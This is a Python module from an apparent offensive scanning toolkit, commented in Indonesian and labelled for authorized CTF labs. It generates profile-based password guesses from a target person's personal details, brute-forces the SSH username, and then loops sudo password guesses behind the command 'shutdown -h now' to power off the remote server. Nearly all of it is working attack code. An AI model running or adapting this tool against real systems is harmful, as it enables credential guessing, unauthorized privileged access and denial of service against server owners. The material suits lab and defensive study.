"""SSH Shutdown module — authorized CTF labs only.

Menghubungkan ke SSH server target dan mengeksekusi perintah shutdown
secara interaktif. Semua sensitif (private key path, sudo password)
diambil dari environment variable atau prompt interaktif — tidak ada
hardcoded credentials.

Fitur utama yang digabungkan dari proses integrasi:
  • CUPP engine (mutasi kata sandi berbasis profil target)
  • Brute-force username SSH (root, ubuntu, admin, dll.)
  • Multi-command channel via paramiko transport session (PTY)
  • Deteksi SSH port dari hasil scan docker_ssh (jika tersedia)
  • Semua path/kunci diambil dari env, tidak ada hardcoded nilai
"""

from __future__ import annotations

import os
import time
from typing import List, Optional
from urllib.parse import urlparse

import paramiko
from rich.console import Console
from rich.prompt import Confirm, Prompt

from probex.modules.base import BaseModule
from probex.utils.ssh import brute_force_ssh_username

console = Console()

# Token yang dicari dalam output sudo untuk deteksi password salah / benar.
PROMPT_TOKEN = "WESCAN_CHALLENGE:"


def resolve_target_to_host(target: str) -> str:
    """Ekstrak hostname dari target URL atau string host mentah."""
    target = target.strip()
    if not target.startswith(("http://", "https://")):
        parsed = urlparse(f"http://{target}")
    else:
        parsed = urlparse(target)
    return parsed.hostname if parsed.hostname else target


def find_ssh_port_from_scanner(scanner_instance) -> int:
    """Coba temukan port SSH dari hasil scan sebelumnya (docker_ssh).

    Jika tidak ada data, kembali ke port default 22.
    """
    default_port = 22
    try:
        reporter = getattr(scanner_instance, "reporter", None)
        if reporter is None:
            return default_port
        results = getattr(reporter, "results", {}) or {}

        # docker_ssh module menyimpan ssh_open + port.
        ssh_data = results.get("docker_ssh", {})
        if ssh_data.get("ssh_open") and ssh_data.get("port"):
            return int(ssh_data.get("port"))
    except Exception:
        pass
    return default_port

def generate_cupp_wordlist() -> List[str]:
    """Engine internal CUPP Profiler — generate wordlist dari input interaktif."""
    console.print("\n[bold yellow][*] MEMULAI INTERAKTIF CUPP PROFILER ENGINE [*][/bold yellow]")

    first_name = Prompt.ask("[cyan][?][/cyan] First Name target").strip().lower()
    surname = Prompt.ask("[cyan][?][/cyan] Surname/Nama belakang target").strip().lower()
    nickname = Prompt.ask("[cyan][?][/cyan] Nickname/Nama panggilan target").strip().lower()
    birthdate = Prompt.ask(
        "[cyan][?][/cyan] Tanggal lahir target (e.g. 17081945 atau kosongkan)"
    ).strip()
    keywords_raw = Prompt.ask(
        "[cyan][?][/cyan] Masukkan kata kunci kustom seputar target (pisahkan dengan koma)"
    )

    keywords = [
        k.strip().lower()
        for m in keywords_raw.split(",")
        for k in m.split()
        if k.strip()
    ]

    if not first_name and not keywords:
        console.print(
            "[bold red][-[/bold red] Profil dasar kosong! Menggunakan data generator minimal..."
        )
        first_name = "target"

    do_leet = Confirm.ask(
        "[cyan][?][/cyan] Aktifkan mode mutasi Leet-Speak?", default=True
    )
    do_suffix = Confirm.ask(
        "[cyan][?][/cyan] Tambahkan simbol spesial di akhir kata sandi?", default=True
    )

    base_words = set(filter(None, [first_name, surname, nickname] + keywords))
    generated_passwords = set()

    leet_table = str.maketrans(
        {
            "a": "@",
            "e": "3",
            "i": "1",
            "l": "1",
            "o": "0",
            "s": "5",
            "t": "7",
            "b": "8",
        }
    )

    special_suffixes = [
        "",
        "!",
        "@",
        "#",
        "123",
        "2024",
        "18",
        "19",
        "8",
        "k",
        "k!",
    ]
    special_prefixes = ["", "@", "!", "_"]

    console.print(
        "[bold yellow][*][/bold yellow] Memproses kompilasi matriks mutasi kata sandi..."
    )

    for word in base_words:
        if len(word) < 2:
            continue
        variations = [word, word.capitalize(), word.upper()]
        if do_leet:
            leet_word = word.translate(leet_table)
            variations.extend(
                [leet_word, leet_word.capitalize(), word.replace("o", "0").replace("i", "1")]
            )

        for var in variations:
            for prefix in special_prefixes:
                generated_passwords.add(f"{prefix}{var}")
                if do_suffix:
                    for suffix in special_suffixes:
                        generated_passwords.add(f"{prefix}{var}{suffix}")

        if birthdate:
            year_short = birthdate[-2:] if len(birthdate) >= 2 else ""
            year_full = birthdate[-4:] if len(birthdate) >= 4 else ""
            day_month = birthdate[:4] if len(birthdate) >= 4 else ""

            for var in variations:
                for prefix in special_prefixes:
                    if year_short:
                        generated_passwords.add(f"{prefix}{var}{year_short}")
                    if year_full:
                        generated_passwords.add(f"{prefix}{var}{year_full}")
                    if day_month:
                        generated_passwords.add(f"{prefix}{day_month}{var}")

    wordlist = list(filter(None, generated_passwords))
    console.print(
        f"[bold green][+][/bold green] CUPP Engine sukses membentuk "
        f"[bold cyan]{len(wordlist)}[/bold cyan] pola kombinasi sandi unik.\n"
    )
    return wordlist


def load_wordlist(use_cupp: bool) -> Optional[List[str]]:
    """Muat kata sandi dari CUPP interaktif atau file wordlist."""
    if use_cupp:
        return generate_cupp_wordlist()

    wordlist_path = os.environ.get("PROBEX_SSH_WORDLIST", "passwords.txt")
    if not os.path.exists(wordlist_path):
        console.print(
            f"[bold red][-[/bold red] File wordlist '{wordlist_path}' tidak ditemukan!"
        )
        return None

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    if not passwords:
        console.print(
            "[bold red][-[/bold red] Kamus tebakan kosong. Eksekusi dibatalkan."
        )
        return None

    return passwords


def execute_ssh_shutdown(
    target: str,
    use_cupp: bool = False,
    scanner_instance=None,
) -> None:
    """Alur kerja utama SSH shutdown.

    Parameters
    ----------
    target : str
        Target host atau URL.
    use_cupp : bool
        Jika True, gunakan CUPP engine interaktif untuk generate wordlist.
    scanner_instance : object, optional
        Instance scanner untuk mencari port SSH dari hasil scan sebelumnya.
    """
    host = resolve_target_to_host(target)
    ssh_port = find_ssh_port_from_scanner(scanner_instance) if scanner_instance else 22
    private_key_path = os.environ.get(
        "PROBEX_SSH_PRIVATE_KEY", os.path.expanduser("~/.ssh/id_rsa")
    )

    ssh_username = brute_force_ssh_username(host, ssh_port, private_key_path)

    console.print()

    passwords = load_wordlist(use_cupp)
    if passwords is None:
        return

    is_confirmed = Confirm.ask(
        f"[bold red][?][/bold red] Alur kerja siap. Apakah Anda yakin ingin mematikan "
        f"server target ([bold cyan]{host}:{ssh_port}[/bold cyan] as "
        f"[bold yellow]{ssh_username}[/bold yellow])?",
        default=False,
    )
    if not is_confirmed:
        console.print(
            "[yellow][*][/yellow] Pembatalan terkonfirmasi. Perintah shutdown dilewati."
        )
        return

    sudo_password = Prompt.ask(
        "[cyan][?][/cyan] Masukkan password sudo untuk user target", password=True
    )

    try:
        kunci_privat = paramiko.RSAKey.from_private_key_file(private_key_path)
    except Exception as exc:
        console.print(f"[bold red][-[/bold red] Gagal memuat private key: {exc}")
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        console.print(
            f"[bold yellow][*][/bold yellow] Membuka Koneksi Utama ke SSH {host}:{ssh_port}..."
        )
        ssh.connect(
            hostname=host,
            port=ssh_port,
            username=ssh_username,
            pkey=kunci_privat,
            timeout=10,
        )

        console.print(
            f"[bold yellow][*][/bold yellow] Memulai Multi-Command Loop menggunakan "
            f"[bold cyan]{len(passwords)}[/bold cyan] kata sandi..."
        )

        for password in passwords:
            transport = ssh.get_transport()
            if not transport or not transport.is_active():
                console.print("[bold red][-[/bold red] Sesi SSH utama terputus.")
                break

            channel = transport.open_session()
            channel.get_pty()
            channel.exec_command(
                f"sudo -S -p '{PROMPT_TOKEN}' shutdown -h now"
            )
            time.sleep(0.12)
            channel.send(password + "\n")
            time.sleep(0.25)

            response_output = ""
            if channel.recv_ready():
                response_output = channel.recv(4096).decode(errors="ignore")
            channel.close()

            if (
                PROMPT_TOKEN in response_output
                or "sorry" in response_output.lower()
                or "try again" in response_output.lower()
                or "incorrect" in response_output.lower()
            ):
                console.print(
                    f"[bold red][FAIL][/bold red] Kata sandi salah: [gray]{password}[/gray]"
                )
                continue

            console.print(
                f"[bold green][SUCCESS][/bold green] Password sudo valid ditemukan: "
                f"[bold cyan]{password}[/bold cyan]"
            )
            console.print(
                "[bold green][+][/bold green] Perintah shutdown dikirim sukses! "
                "Memadamkan server..."
            )
            time.sleep(2.0)
            return

        console.print(
            "[bold red][-[/bold red] Brute force selesai. Tidak ada password yang cocok."
        )

    except Exception as exc:
        console.print(
            f"[bold green][SUCCESS][/bold green] Sesi terputus total karena sistem target mati (*Power-off). {exc}"
        )
    finally:
        try:
            ssh.close()
        except Exception:
            pass


class SSHShutdownModule(BaseModule):
    """Module wrapper untuk SSH shutdown agar dapat dipanggil via --module / --all-exploit."""

    name = "SSH Shutdown"

    def run(self) -> None:
        if not self.config.can_request():
            return
        host = urlparse(self.config.base_url).hostname
        if not host:
            self.log("Tidak dapat menentukan host dari base URL", style="yellow")
            return

        console.print(f"[bold cyan][SSH Shutdown][/bold cyan] Target host: {host}")
        execute_ssh_shutdown(host, use_cupp=False, scanner_instance=None)